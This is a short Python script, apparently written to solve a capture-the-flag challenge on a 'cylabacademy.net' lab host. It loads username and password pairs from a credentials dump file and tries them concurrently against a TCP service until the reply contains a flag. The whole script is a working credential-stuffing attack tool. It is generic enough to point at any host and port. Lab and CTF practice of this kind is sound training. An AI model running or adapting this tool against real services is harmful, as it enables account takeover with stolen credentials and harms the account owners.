from concurrent.futures import ThreadPoolExecutor, as_completed
import socket

HOST = "chatelaine.cylabacademy.net" # change this
PORT = 11241 # change this too

def try_cred(pair):
    username, password = pair

    try:
        s = socket.create_connection((HOST, PORT), timeout=3)

        # Adjust this once we know the actual protocol.
        s.sendall(username.encode() + b"\n")
        s.sendall(password.encode() + b"\n")

        result = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            result += chunk

            if b"flag" in result.lower() or b"{" in result:
                break

        s.close()

        return username, password, result

    except Exception as e:
        return username, password, f"ERROR: {e}".encode()


with open("creds-dump.txt", errors="ignore") as f:
    creds = [
        tuple(line.strip().split(";", 1))
        for line in f
        if ";" in line
    ]

with ThreadPoolExecutor(max_workers=20) as pool:
    futures = [pool.submit(try_cred, c) for c in creds]

    for future in as_completed(futures):
        username, password, result = future.result()

        print(f"{username}:{password} -> {result.decode(errors='replace')}")

        if b"flag" in result.lower() or b"{" in result:
            print(f"\n[+] FOUND: {username}:{password}")
            print(result.decode(errors="replace"))
            break
